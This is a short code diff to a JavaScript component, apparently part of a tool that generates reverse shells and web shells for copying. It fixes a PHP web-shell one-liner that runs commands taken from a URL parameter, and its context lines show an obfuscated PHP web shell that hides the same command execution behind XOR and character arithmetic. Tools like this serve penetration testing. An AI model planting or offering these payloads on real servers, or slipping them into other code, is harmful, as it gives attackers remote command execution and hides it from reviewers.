@@ -32,7 +32,7 @@ export default (props) => {
 	const successInfoReverseShell = () => {
 		message.success('Your reverse shell has been copied');
 	};
-	const oneLiner = `<?php system($_GET["cmd"]);?`;
+	const oneLiner = `<?php system($_GET["cmd"]);?>`;
 	const shell_obfuscate =
 		`<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
 		"${$_}['_'^'o'];echo`$_`?>";
